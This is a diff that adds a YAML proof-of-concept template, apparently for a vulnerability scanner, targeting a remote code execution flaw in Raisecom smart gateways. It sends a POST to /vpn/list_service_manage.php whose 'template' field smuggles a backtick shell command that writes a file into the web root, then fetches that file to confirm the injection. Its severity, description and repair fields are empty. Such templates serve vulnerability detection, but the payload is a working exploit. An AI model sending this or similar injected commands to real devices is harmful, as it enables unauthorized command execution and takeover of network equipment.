@@ -1,0 +1,25 @@
+id:
+
+info:
+  name: 瑞斯康达智能网关RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /vpn/list_service_manage.php
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+  data: |
+    Nradius_submit=true&template=%60echo+-e+%27123456%27%3E%2Fwww%2Ftmp%2Ftest.php%60
+response1:
+requests2:
+  method: GET
+  path: /tmp/test.php
+  headers:
+response2:
+  body: 123
+  code: 200
